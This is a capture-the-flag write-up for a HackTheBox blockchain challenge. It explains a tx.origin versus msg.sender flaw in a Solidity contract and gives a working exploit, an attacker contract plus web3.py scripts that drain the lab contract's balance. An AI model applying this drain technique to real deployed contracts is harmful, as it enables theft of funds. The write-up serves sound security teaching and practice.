# Distract and Destroy — HackTheBox Blockchain Challenge Writeup

**Challenge**: Distract and Destroy  
**Difficulty**: Very Easy  
**Category**: Blockchain  

---

## Challenge Description

> After defeating her first monster, Alex stood frozen, staring up at another massive, hulking creature that loomed over her. She knew that this was a fight she couldn't win on her own. She turned to her guildmates, trying to come up with a plan. "We need to distract it," Alex said. "If we can get it off balance, we might be able to take it down." Her guildmates nodded, their eyes narrowed in determination. They quickly came up with a plan to lure the monster away from their position, using a combination of noise and movement to distract it. As they put their plan into action, Alex drew her sword and waited for her chance.

This challenge builds on the basic creature combat concept but introduces a defense mechanism that requires understanding `tx.origin` vs `msg.sender` in Solidity.

---

## Initial Reconnaissance

After spawning the instance, I got:
- RPC URL
- Private key
- Target contract address (Creature)
- Flag endpoint

The challenge provides two contract files:

### Setup.sol
```solidity
contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }
    
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

Same win condition as before: drain the Creature contract.

### Creature.sol
```solidity
contract Creature {
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 1000;
    }

    function attack(uint256 _damage) external {
        if (aggro == address(0)) {
            aggro = msg.sender;
        }

        if (_isOffBalance() && aggro != msg.sender) {
            lifePoints -= _damage;
        } else {
            lifePoints -= 0;
        }
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _isOffBalance() private view returns (bool) {
        return tx.origin != msg.sender;
    }
}
```

---

## Analyzing the Vulnerability

Looking at the `attack` function, there are two conditions that must be met for damage to be dealt:

```solidity
if (_isOffBalance() && aggro != msg.sender) {
    lifePoints -= _damage;
}
```

### Condition 1: `_isOffBalance()`
```solidity
function _isOffBalance() private view returns (bool) {
    return tx.origin != msg.sender;
}
```

This checks if the call is coming through a contract. `tx.origin` is always the original EOA (wallet) that started the transaction, while `msg.sender` is the immediate caller.

- Direct EOA call: `tx.origin == msg.sender` → returns `false`
- Contract call: `tx.origin != msg.sender` → returns `true`

### Condition 2: `aggro != msg.sender`

The `aggro` variable is set to `msg.sender` on the first attack. For subsequent attacks to deal damage, the attacker must be different from whoever has aggro.

### The Vulnerability

To exploit this:
1. **First**, call `attack()` directly from our EOA to set `aggro` to our address
2. **Then**, deploy a contract that calls `attack()` 
   - `tx.origin` = our EOA
   - `msg.sender` = our attack contract
   - `aggro` = our EOA (from step 1)
   - This satisfies both conditions: `tx.origin != msg.sender` AND `aggro != msg.sender`

---

## Prerequisites

- Python 3.x with web3.py, py-solc-x, and requests
- Active HTB instance

```bash
pip install web3 py-solc-x requests
```

---

## Exploitation

### The Attack Contract

I created a simple contract that calls `attack()` and `loot()`:

```solidity
interface ICreature {
    function attack(uint256 _damage) external;
    function loot() external;
}

contract AttackContract {
    ICreature public creature;
    address public owner;
    
    constructor(address _creatureAddress) {
        creature = ICreature(_creatureAddress);
        owner = msg.sender;
    }
    
    function executeExploit() external {
        creature.attack(1000);
        creature.loot();
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
```

### Step 1: Connect and Validate

```python
w3 = Web3(Web3.HTTPProvider(RPC_URL))

if not w3.is_connected():
    print("Failed to connect to RPC!")
    exit(1)

code = w3.eth.get_code(CREATURE_ADDRESS)
if code == b'' or code == '0x':
    print("Contract not found - instance might have expired")
    exit(1)
```

### Step 2: Set Aggro with Direct Attack

First, attack directly from our EOA to set `aggro`:

```python
nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
attack_txn = creature.functions.attack(1).build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})
signed_attack = w3.eth.account.sign_transaction(attack_txn, PRIVATE_KEY)
attack_hash = w3.eth.send_raw_transaction(signed_attack.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(attack_hash)
```

This sets `aggro` to our EOA address but deals 0 damage (because `_isOffBalance()` returns false).

### Step 3: Compile and Deploy Attack Contract

```python
compiled_sol = compile_source(attack_contract_source, output_values=['abi', 'bin'], solc_version='0.8.13')

# Extract contract interface
contract_interface = None
for contract_name, contract_data in compiled_sol.items():
    if 'AttackContract' in contract_name:
        contract_interface = contract_data
        break

bytecode = contract_interface['bin']
abi = contract_interface['abi']

# Deploy
AttackContract = w3.eth.contract(abi=abi, bytecode=bytecode)
nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
transaction = AttackContract.constructor(CREATURE_ADDRESS).build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 3000000,
    'gasPrice': w3.eth.gas_price
})
signed_txn = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
attack_contract_address = tx_receipt.contractAddress
```

### Step 4: Execute the Exploit

Call `executeExploit()` from the deployed contract:

```python
attack_contract = w3.eth.contract(address=attack_contract_address, abi=abi)

nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
exploit_txn = attack_contract.functions.executeExploit().build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 500000,
    'gasPrice': w3.eth.gas_price
})

signed_exploit = w3.eth.account.sign_transaction(exploit_txn, PRIVATE_KEY)
exploit_hash = w3.eth.send_raw_transaction(signed_exploit.raw_transaction)
exploit_receipt = w3.eth.wait_for_transaction_receipt(exploit_hash)
```

Now:
- `tx.origin` = our EOA
- `msg.sender` = attack contract address
- `aggro` = our EOA
- `_isOffBalance()` returns `true`
- `aggro != msg.sender` returns `true`
- Damage is dealt! → lifePoints becomes 0

The contract then calls `loot()` and transfers the funds back to us.

---

## Running the Solution

1. **Spawn a new HTB instance**
2. **Update credentials** in `solution.py`:
   - `RPC_URL`
   - `PRIVATE_KEY`
   - `YOUR_ADDRESS`
   - `CREATURE_ADDRESS`
   - `FLAG_ENDPOINT`
3. **Run**:

```bash
python solution.py
```

### Expected Output

```
Connected to RPC
Initial attack tx: 0x...
Attack contract deployed at: 0x...
Exploit tx: 0x...
Life Points now: 0
Done!

Flag: HTB{...}
```

If the flag endpoint is unreachable:
```
Connected to RPC
Initial attack tx: 0x...
Attack contract deployed at: 0x...
Exploit tx: 0x...
Life Points now: 0
Done!

Couldn't fetch flag from endpoint. Check the HTB platform for your flag.
```

---

## Key Takeaways

1. **tx.origin vs msg.sender**: Understanding the difference is crucial
   - `tx.origin` = original transaction signer (always an EOA)
   - `msg.sender` = immediate caller (can be contract or EOA)

2. **State manipulation**: Sometimes you need multiple transactions to set up the right state before exploitation

3. **Contract-based attacks**: Many exploits require deploying your own attack contract to bypass checks

4. **Inline compilation**: py-solc-x lets you compile Solidity in Python scripts without external tools

### What I Learned

- **Advanced access control patterns**: How contracts attempt to distinguish between EOA and contract calls
- **Multi-step exploits**: Setting up state in one transaction, exploiting in another
- **Solidity compilation in Python**: Using py-solc-x to compile contracts on the fly
- **tx.origin security anti-pattern**: Why checking `tx.origin` is generally a bad practice

### Common Issues

- **"Contract not found"**: Instance expired - spawn a new one
- **"Initial attack failed"**: Check the CREATURE_ADDRESS is correct
- **"Exploit failed"**: Make sure you ran the initial attack to set aggro first
- **Compilation errors**: Ensure py-solc-x is installed and can download Solidity compiler

---

## Quick Reference

### Contract Functions Used
- `attack(uint256 _damage)` - Deals damage if conditions are met
- `loot()` - Transfers contract balance if HP is 0
- `lifePoints()` - View current HP (starts at 1000)

### Exploit Flow
1. Direct `attack(1)` from EOA → Sets aggro, deals 0 damage
2. Deploy AttackContract
3. Call `executeExploit()` → Contract attacks (deals 1000 damage), loots, sends funds back
4. Retrieve flag from endpoint

### File Structure
```
blockchain_distract_and_destroy/
├── Creature.sol      # Target contract with tx.origin check
├── Setup.sol         # Deployment & win condition
├── solution.py       # Python exploitation script
└── README.md         # This writeup
```

---

## Resources

- [Solidity tx.origin Documentation](https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin)
- [web3.py Documentation](https://web3py.readthedocs.io/)
- [py-solc-x Documentation](https://solcx.readthedocs.io/)
- [HackTheBox Platform](https://www.hackthebox.com/)

**Challenge Rating**: ⭐⭐⭐☆☆ (Easy - Good for learning tx.origin vulnerabilities)

**Time to Solve**: ~15-30 minutes

---

*Building on blockchain security fundamentals!*
